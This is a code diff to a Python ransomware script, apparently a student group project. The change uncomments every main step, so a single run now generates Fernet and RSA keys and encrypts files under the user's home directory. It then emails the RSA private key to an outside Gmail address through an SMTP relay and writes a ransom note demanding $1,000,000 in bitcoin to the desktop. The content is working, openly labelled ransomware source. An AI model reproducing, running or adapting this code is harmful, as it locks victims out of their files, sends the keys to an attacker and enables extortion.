@@ -10,7 +10,7 @@
 # this then it is at your own risk.
 #
 # Author: cjd0125 //dogthebountycoder
-# Version 1.1 11/17/2022
+# Version 1.2 11/18/2022
 #######################################################################################################################
 #######################################################################################################################
 # Instructions:
@@ -43,21 +43,23 @@
 
 import glob
 import os
-import cryptography
 import rsa
 from cryptography.fernet import Fernet
 import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
 
 ######################################################################################################
 ###############Globals - EDIT these to your location to encrypt and store keys########################
 ######################################################################################################
 
 # Step 1:
-FERNET_KEY_LOCATION = os.path.expanduser('~') + os.getenv("USER") + '/'  # OPTIONAL - CHANGE TO KEY DIRECTORY
-RSA_KEY_LOCATION = os.path.expanduser('~') + os.getenv("USER") + '/'  # OPTIONAL - CHANGE TO KEY DIRECTORY
-ENCRYPTION_PATH = os.path.expanduser('~') + os.getenv("USER") + '/'  # OPTIONAL - CHANGE TO KEY DIRECTORY
-DESKTOP_DIRECTORY = os.path.expanduser('~') + os.getenv(
-    "USER") + '/' + 'Desktop'  # # OPTIONAL - CHANGE TO DESKTOP DIRECTORY
+FERNET_KEY_LOCATION = '/home/'  # OPTIONAL - CHANGE TO KEY DIRECTORY
+RSA_KEY_LOCATION = '/home/'  # OPTIONAL - CHANGE TO KEY DIRECTORY
+#
+ENCRYPTION_PATH = os.path.expanduser('~') + '/'  # OPTIONAL - CHANGE TO Encryption Directory
+DESKTOP_DIRECTORY = os.path.expanduser('~') + '/Desktop/'
 SENDER_EMAIL = 'EMAIL'  # CHANGE TO SENDER EMAIL
 RECEIVER_EMAIL = 'EMAIL'  # CHANGE TO RECEIVER EMAIL
 
@@ -154,15 +156,25 @@ def decrypt_rsa():
 
 # send privKey in email
 def send_privkey():
-    sender = SENDER_EMAIL  # CHANGE TO SENDER EMAIL
-    receivers = RECEIVER_EMAIL  # CHANGE TO RECEIVER EMAIL
-    message = """From: Private Key Sender <email@email.me>
-To: To Person <amrood.admin@gmail.com>
-Subject: Group 18 Private Key\n""" + ' ' + open(RSA_KEY_LOCATION + 'privateKey.pem', 'r').read() + """
-    Enjoy
-    """
+    # Set up email headers
+    sub = "Group 18 Private Key"
+    body = open(RSA_KEY_LOCATION + 'privateKey.pem', 'r').read()
+    s_email = "cjdinvesting@gmail.com" # INPUT SENDER EMAIL
+    r_email = "cjdinvesting@gmail.com" # INPUT RECEIVING EMAIL
+
+    # Set up message contents
+    message = MIMEMultipart()
+    message["From"] = s_email
+    message["To"] = r_email
+    message["Subject"] = sub
+    message.attach(MIMEText(body, "plain"))
+
+    # Set message as string for plain text delivery
+    txt = message.as_string()
+
+    # smtp objects for deliver, relay , etc.
     smtpObj = smtplib.SMTP('relay.appriver.com', 2525)  # use any relay you wish or keep default relay.appriver.com 2525
-    smtpObj.sendmail(sender, receivers, message)
+    smtpObj.sendmail(s_email, r_email, txt)
 
 
 # delete privKey off client
@@ -172,8 +184,8 @@ def delete_private_key():
 
 # create ransom message on the desktop
 def create_ransom_message():
-    message = "<html>your files are held hostange. Pay the ransom now! $1,000,000 in bitcoin to my address please. Thanks - //dogthebountycoder</html>"
-    with open(DESKTOP_DIRECTORY + 'INDEX.HTML', 'w') as f:  # CHANGE DESKTOP DIRECTORY TO USERS DIRECTORY.
+    message = "Your files are held hostange. Pay the ransom now! $1,000,000 in bitcoin to my address please. Thanks - //Group18"
+    with open(DESKTOP_DIRECTORY + 'Ransom.txt', 'w') as f:  # CHANGE DESKTOP DIRECTORY TO USERS DIRECTORY.
         f.write(message)
 ##########################################
 ##########End Functions###################
@@ -187,27 +199,27 @@ def create_ransom_message():
 ### WHEN YOU ARE READY FOR USE, YOU MAY UNCOMMENT THEM ALL SO IT WORKS ON ONE RUN.###
 
 # Step 2:
-# generate_fernet_key()
+generate_fernet_key()
 
 # Step 3:
-# generate_rsa_keys()
+generate_rsa_keys()
 
 # Step 4:
-# filesarray = get_files()
-# encrypt_fernet(filesarray, FERNET_KEY_LOCATION+'fernetKey.key')
+filesarray = get_files()
+encrypt_fernet(filesarray, FERNET_KEY_LOCATION+'fernetKey.key')
 
 # Step 5:
-# encrypt_rsa()
+encrypt_rsa()
 
 # Step 6:
-# send_privkey()
+send_privkey()
 
 # Step 7: COMMENT THIS OUT IF YOU WANT TO KEEP THE PRIVATE KEY FOR TESTING OTHERWISE IT WILL BE DELETED AND YOU WILL ###
 # HAVE TO REBUILD THE PRIVATE KEY FILE FROM THE TEXT IN EMAIL ###
 # delete_private_key()
 
 # Step 8:
-# create_ransom_message()
+create_ransom_message()
 
 # Step 9:
 # decrypt_rsa()
